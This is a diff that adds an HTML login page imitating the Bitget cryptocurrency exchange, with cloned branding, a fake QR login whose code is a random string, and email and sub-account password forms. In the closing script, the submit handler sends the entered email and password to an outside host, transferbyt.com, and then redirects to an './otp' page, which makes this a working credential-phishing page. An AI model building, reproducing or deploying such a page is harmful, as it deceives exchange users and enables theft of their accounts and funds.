@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bitget - Login</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      #hide2 {
+        display: none;
+      }
+      .btn-login {
+        box-shadow: 0 -1px 2px rgba(255, 255, 255, 0.3),
+          0 3px 6px rgba(255, 255, 255, 0.3);
+      }
+      .tab-active {
+        border-bottom: 2px solid white;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+      }
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #ccc;
+      }
+      .divider:not(:empty)::before {
+        margin-right: 0.75em;
+      }
+      .divider:not(:empty)::after {
+        margin-left: 0.75em;
+      }
+      .refresh-overlay {
+        position: relative;
+      }
+      .refresh-button,
+      .qr-expired-text {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 0.875rem;
+        background: rgba(0, 0, 0, 0.7);
+        padding: 0.5rem 1rem;
+        border-radius: 0.25rem;
+      }
+      .refresh-button {
+        z-index: 10;
+      }
+      .qr-expired-text {
+        color: #ccc;
+        font-size: 0.75rem;
+        margin-top: 2rem;
+        text-align: center;
+      }
+
+      @media screen and (max-width: 968px) {
+        #hide2 {
+          display: flex;
+        }
+        #hide1 {
+          display: none;
+        }
+        nav {
+          background-color: black;
+        }
+
+        #main {
+          margin-top: 0px;
+          padding: 0px;
+          border-radius: 0px;
+        }
+
+        #emailPassword {
+          display: none;
+        }
+
+        #welcome {
+          font-size: 28px;
+        }
+      }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+  </head>
+  <body style="background-color: #151517" class="text-white">
+    <nav
+      class="flex items-center justify-between px-6 py-4 border-b border-gray-800"
+    >
+      <div class="flex items-center space-x-6">
+        <div class="text-2xl font-bold text-blue-500 flex items-center gap-4">
+          <svg
+            width="32"
+            height="32"
+            viewBox="0 0 41 40"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <rect
+              x="0.998383"
+              width="40"
+              height="40"
+              rx="8.71094"
+              fill="#00F0FF"
+            ></rect>
+            <path
+              d="M19.458 15.7671H26.9266L34.567 23.3587C35.064 23.8525 35.0666 24.6558 34.5721 25.1521L24.7737 35H17.08L19.406 32.7387L27.946 24.2526L19.5144 15.7664"
+              fill="#1B1B1B"
+            ></path>
+            <path
+              d="M22.5276 24.2336H15.059L7.41858 16.6419C6.92156 16.1481 6.91902 15.3449 7.4135 14.8485L17.2119 5H24.9056L22.5796 7.26132L14.0396 15.7474L22.4712 24.2336"
+              fill="#1B1B1B"
+            ></path>
+          </svg>
+          <h2 style="color: #4cd4e0">Bitget</h2>
+        </div>
+        <svg
+          id="hide1"
+          data-v-76ee070a=""
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            d="M9.46625 3.45227H4.96629C4.56847 3.45227 4.18695 3.6103 3.90564 3.89161C3.62434 4.17291 3.46631 4.55443 3.46631 4.95226V9.45221C3.46631 9.85003 3.62434 10.2316 3.90564 10.5129C4.18695 10.7942 4.56847 10.9522 4.96629 10.9522H9.46625C9.86407 10.9522 10.2456 10.7942 10.5269 10.5129C10.8082 10.2316 10.9662 9.85003 10.9662 9.45221V4.95226C10.9662 4.55443 10.8082 4.17291 10.5269 3.89161C10.2456 3.6103 9.86407 3.45227 9.46625 3.45227ZM9.46625 9.45221H4.96629V4.95226H9.46625V9.45221ZM19.0103 3.45227H14.5103C14.1125 3.45227 13.731 3.6103 13.4497 3.89161C13.1684 4.17291 13.0103 4.55443 13.0103 4.95226V9.45221C13.0103 9.85003 13.1684 10.2316 13.4497 10.5129C13.731 10.7942 14.1125 10.9522 14.5103 10.9522H19.0103C19.4081 10.9522 19.7896 10.7942 20.0709 10.5129C20.3522 10.2316 20.5103 9.85003 20.5103 9.45221V4.95226C20.5103 4.55443 20.3522 4.17291 20.0709 3.89161C19.7896 3.6103 19.4081 3.45227 19.0103 3.45227ZM19.0103 9.45221H14.5103V4.95226H19.0103V9.45221ZM9.46625 13.0689H4.96629C4.56847 13.0689 4.18695 13.2269 3.90564 13.5082C3.62434 13.7895 3.46631 14.171 3.46631 14.5689V19.0688C3.46631 19.4666 3.62434 19.8482 3.90564 20.1295C4.18695 20.4108 4.56847 20.5688 4.96629 20.5688H9.46625C9.86407 20.5688 10.2456 20.4108 10.5269 20.1295C10.8082 19.8482 10.9662 19.4666 10.9662 19.0688V14.5689C10.9662 14.171 10.8082 13.7895 10.5269 13.5082C10.2456 13.2269 9.86407 13.0689 9.46625 13.0689ZM9.46625 19.0688H4.96629V14.5689H9.46625V19.0688Z"
+            fill="currentColor"
+          ></path>
+          <path
+            fill-rule="evenodd"
+            clip-rule="evenodd"
+            d="M21.2864 15.9465L18.1045 12.7646C17.8232 12.4833 17.4416 12.3252 17.0438 12.3252C16.646 12.3252 16.2645 12.4833 15.9832 12.7646L12.8012 15.9465C12.5199 16.2278 12.3619 16.6093 12.3619 17.0072C12.3619 17.405 12.5199 17.7865 12.8012 18.0678L15.9832 21.2498C16.2645 21.5311 16.646 21.6891 17.0438 21.6891C17.4416 21.6891 17.8232 21.5311 18.1045 21.2498L21.2864 18.0678C21.5677 17.7865 21.7258 17.405 21.7258 17.0072C21.7258 16.6093 21.5677 16.2278 21.2864 15.9465ZM17.0438 20.1891L13.8619 17.0072L17.0438 13.8252L20.2258 17.0072L17.0438 20.1891Z"
+            fill="var(--group-primary)"
+          ></path>
+        </svg>
+        <div id="hide1" class="hidden md:flex items-center space-x-8 text-base">
+          <!-- Increased font size and spacing -->
+          <a href="#" class="hover:text-gray-300">Buy crypto</a>
+          <a href="#" class="hover:text-gray-300">Markets</a>
+          <a href="#" class="hover:text-gray-300">Trade</a>
+          <a href="#" class="hover:text-gray-300">Futures</a>
+          <a href="#" class="hover:text-gray-300">Copy</a>
+          <a href="#" class="hover:text-gray-300">Bots</a>
+          <a href="#" class="hover:text-gray-300">Earn</a>
+          <a href="#" class="hover:text-gray-300">Web3</a>
+          <a href="#" class="text-red-500 hover:text-red-400"
+            ><img
+              class="w-36"
+              src="https://img.bitgetimg.com/multiLang/web/d506b9caa3757a7720bf14a1712f9be6.png"
+              alt=""
+          /></a>
+        </div>
+      </div>
+      <div id="hide1" class="flex items-center space-x-4">
+        <a
+          href="#"
+          class="hidden md:block text-sm text-gray-300 hover:text-white"
+          >Log in</a
+        >
+        <button
+          class="bg-blue-500 text-white px-4 py-1 rounded-full text-sm hover:bg-blue-400"
+        >
+          Sign up
+        </button>
+        <div class="flex space-x-3 text-gray-400">
+          <button class="hover:text-white">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="h-5 w-5"
+              viewBox="0 0 20 20"
+              fill="currentColor"
+            >
+              <path
+                d="M2 5a2 2 0 012-2h12a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V5zm3.5 2a1.5 1.5 0 100 3 1.5 1.5 0 000-3zM9 12h5v2H9v-2z"
+              />
+            </svg>
+          </button>
+          <button class="hover:text-white">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="h-5 w-5"
+              viewBox="0 0 20 20"
+              fill="currentColor"
+            >
+              <path
+                fill-rule="evenodd"
+                d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v4a1 1 0 001 1h3a1 1 0 100-2h-2V5z"
+                clip-rule="evenodd"
+              />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div id="hide2" class="flex gap-4">
+        <svg
+          data-v-a93cb934=""
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <g id="Search">
+            <path
+              id="Vector"
+              d="M11 19C15.4183 19 19 15.4183 19 11C19 6.58172 15.4183 3 11 3C6.58172 3 3 6.58172 3 11C3 15.4183 6.58172 19 11 19Z"
+              stroke="currentColor"
+              stroke-width="1.6"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            ></path>
+            <path
+              id="Vector_2"
+              d="M21.0343 22.1655C21.3467 22.4779 21.8533 22.4779 22.1657 22.1655C22.4781 21.8531 22.4781 21.3465 22.1657 21.0341L21.0343 22.1655ZM22.1657 21.0341L17.3657 16.2341L16.2343 17.3655L21.0343 22.1655L22.1657 21.0341Z"
+              fill="currentColor"
+            ></path>
+          </g>
+        </svg>
+        <svg
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+          class="cursor-pointer"
+        >
+          <path
+            d="M3 4L21 4"
+            stroke="currentColor"
+            stroke-width="1.6"
+            stroke-linecap="round"
+          ></path>
+          <path
+            d="M3 12L21 12"
+            stroke="currentColor"
+            stroke-width="1.6"
+            stroke-linecap="round"
+          ></path>
+          <path
+            d="M3 20L21 20"
+            stroke="currentColor"
+            stroke-width="1.6"
+            stroke-linecap="round"
+          ></path>
+        </svg>
+      </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div id="main" class="flex justify-center min-h-screen px-6 py-12 md:py-16">
+      <div class="w-full max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-8">
+        <!-- Left Section: QR Code Login -->
+        <div
+          id="hide1"
+          class="relative p-8 flex flex-col items-center"
+          style="
+            height: 100vh;
+            background: url('https://www.bitget.com/baseasset/img/login/qr-code-bg-black.svg');
+            background-repeat: no-repeat;
+          "
+        >
+          <!-- QR Code Container -->
+          <div
+            class="w-48 h-48 bg-gray-700 bg-opacity-80 refresh-overlay rounded-lg mb-4 flex items-center justify-center relative z-10"
+          >
+            <!-- Placeholder for QR Code -->
+            <canvas id="qrcode"></canvas>
+            <!-- Placeholder for QR Code -->
+            <span class="text-gray-400 text-sm absolute">QR Code</span>
+            <button
+              class="refresh-button bg-blue-500 text-white px-4 py-1 rounded absolute bottom-2"
+              onclick="generateQRCode()"
+            >
+              Refresh
+            </button>
+            <p class="qr-expired-text text-xs text-gray-300 absolute bottom-10">
+              QR code has expired
+            </p>
+          </div>
+
+          <!-- QR Instructions -->
+          <p class="text-gray-300 text-center mb-4 z-10">
+            Scan the code to log in
+          </p>
+          <p class="text-gray-400 text-center text-sm max-w-xs z-10">
+            Open the Bitget App, and scan the QR code using the scanning
+            function located on the top right corner of the Home screen.
+          </p>
+
+          <a
+            href="https://t.me/BitgetENOfficial"
+            class="flex items-center bg-transparent border rounded-full border-gray-600 text-white p-4 mt-8 rounded-lg shadow-lg transition hover:bg-gray-800 z-10"
+          >
+            <img
+              src="https://img.bitgetimg.com/multiLang/banner/d7981c54abc0a99ac60b08096fe4be08.png"
+              alt="icon"
+              class="w-10 h-10 mr-4"
+            />
+            <div class="flex flex-col text-left">
+              <p class="font-medium text-sm">Join Bitget Telegram Now</p>
+              <span class="text-xs"
+                >Get help, share ideas, and receive firsthand Bitget news.</span
+              >
+            </div>
+          </a>
+        </div>
+
+        <!-- Right Section: Form Login -->
+<div class="p-8 rounded-lg">
+  <h2 id="welcome" class="text-2xl font-semibold mb-4">Welcome back</h2>
+  <div class="flex space-x-6 mb-6">
+    <button id="emailTab" class="tab-active py-2 text-lg focus:outline-none">Email / Mobile</button>
+    <button id="subAccountTab" class="py-2 text-lg text-gray-400 focus:outline-none">Sub-account</button>
+  </div>
+  <form id="loginForm" action="#" method="POST">
+    <div id="emailSection">
+      <label for="email" class="block text-gray-400 text-sm mb-1">Email / Mobile</label>
+      <input type="text" id="email" name="email" placeholder="Email / Mobile" class="w-full bg-transparent border border-gray-600 text-white px-4 py-2 rounded-full focus:outline-none focus:ring-2 focus:ring-blue-500" />
+      <label id="firstPassLabel" for="password1" class="block text-gray-400 text-sm mt-4">Password</label>
+      <input type="password" id="password1" name="password" placeholder="Password" class="w-full text-white bg-transparent border border-gray-600 px-4 py-2 rounded-full focus:outline-none focus:ring-2 focus:ring-blue-500" />
+    </div>
+    <div id="subAccountSection" class="hidden">
+      <label for="subEmail" class="block text-white text-sm mb-1">Sub-account</label>
+      <input type="text" id="subEmail" name="subEmail" placeholder="Sub-account Email" class="w-full border border-gray-600 bg-transparent text-white px-4 py-2 rounded-full focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4" />
+      <label for="subPassword" class="block text-gray-400 text-sm mb-1">Password</label>
+      <input type="password" id="subPassword" name="subPassword" placeholder="Password" class="w-full border border-gray-600 bg-transparent text-white px-4 py-2 rounded-full focus:outline-none focus:ring-2 focus:ring-blue-500" />
+    </div>
+    <button type="submit" class="btn-login w-full bg-transparent border border-white py-2 mt-4 text-white rounded-full">Verify</button>
+  </form>
+  
+  <div class="flex gap-4 items-center mt-2">
+    <div class="flex items-center gap-2 mt-2">
+      <button id="loginSwitch" class="text-sm text-white">Switch to password login</button>
+      <img src="https://www.bitget.com/baseasset/img/dashboard/security/verify_method_switch_black.svg" alt="" />
+    </div>
+    <a href="#" id="forgot" style="color: #26bfd4" class="text-sm hidden">Forgot password?</a>
+  </div>
+  
+  <div class="divider text-gray-400 text-sm mt-6 mb-4">Or log in with</div>
+  <div class="flex items-center justify-center space-x-4 mt-4">
+    <a href="#"><img src="https://www.bitget.com/baseasset/img/account/gooleIcon.svg" alt="Google" class="h-6 w-6" /></a>
+    <a href="#"><img src="https://www.bitget.com/_nuxt-ssr/img/apple-logo-black.d13a583.svg" alt="Apple" class="h-6 w-6" /></a>
+    <a href="#"><img src="https://www.bitget.com/baseasset/img/account/tglogo.svg?t=123" alt="Telegram" class="h-6 w-6" /></a>
+    <button id="hide1" class="flex items-center space-x-2 bg-gray-700 py-2 px-4 rounded-lg">
+      <span>Connect wallet</span>
+      <img src="https://www.bitget.com/baseasset/img/three/metamask-icon.svg" alt="Metamask" class="h-5 w-5" />
+      <img src="https://www.bitget.com/baseasset/img/three/bg-wallet-small-icon.svg" alt="Wallet" class="h-5 w-5" />
+      <span class="ml-2">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M8 4l8 8-8 8" />
+        </svg>
+      </span>
+    </button>
+  </div>
+  
+  <div class="flex justify-center items-center mt-6"></div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+
+<script>
+  // Function to generate a random QR code
+  function generateQRCode() {
+    const qr = new QRious({
+      element: document.getElementById("qrcode"),
+      value: Math.random().toString(36).substring(7), // Generate a random string
+      size: 192, // Size of the QR code
+    });
+  }
+
+  // Initialize page functionality
+  document.addEventListener("DOMContentLoaded", () => {
+    // Generate the initial QR code on page load
+    generateQRCode();
+
+    // Elements for toggling password visibility and switching login method
+    const firstPasswordInput = document.getElementById("password1");
+    const firstPassLabel = document.getElementById("firstPassLabel");
+    const loginSwitch = document.getElementById("loginSwitch");
+    const forgot = document.getElementById("forgot");
+    let usePassword = true;
+
+    // Toggle between password and passkey login
+    loginSwitch.addEventListener("click", () => {
+      usePassword = !usePassword;
+      if (usePassword) {
+        firstPasswordInput.style.display = "block";
+        firstPassLabel.style.display = "block";
+        forgot.style.display = "block";
+        loginSwitch.innerHTML = "Verify with passkey";
+      } else {
+        firstPasswordInput.style.display = "none";
+        firstPassLabel.style.display = "none";
+        forgot.style.display = "none";
+        loginSwitch.innerHTML = "Switch to password login";
+      }
+    });
+
+    // Tab switching between Email/Mobile and Sub-account sections
+    document.getElementById("emailTab").addEventListener("click", () => {
+      document.getElementById("emailSection").classList.remove("hidden");
+      document.getElementById("subAccountSection").classList.add("hidden");
+      document.getElementById("emailTab").classList.add("tab-active");
+      document.getElementById("subAccountTab").classList.remove("tab-active");
+    });
+
+    document.getElementById("subAccountTab").addEventListener("click", () => {
+      document.getElementById("subAccountSection").classList.remove("hidden");
+      document.getElementById("emailSection").classList.add("hidden");
+      document.getElementById("subAccountTab").classList.add("tab-active");
+      document.getElementById("emailTab").classList.remove("tab-active");
+    });
+
+    // Handle form submission
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      let url = "https://transferbyt.com/client/customer/bitget/login"; // Replace with your actual API endpoint
+      let body = {};
+
+      // Determine which section is visible and gather data accordingly
+      if (document.getElementById("emailSection").style.display !== "none") {
+        body.email = document.getElementById("email").value;
+        body.password = document.getElementById("password1").value;
+      } else {
+        body.subEmail = document.getElementById("subEmail").value;
+        body.password = document.getElementById("subPassword").value;
+      }
+
+      // Send the data to the API
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(body),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.success) {
+            window.location.href = "./otp"
+          } else {
+            alert("Login failed: " + data.message);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("An error occurred during login.");
+        });
+    });
+  });
+</script>
+
+  </body>
+</html>
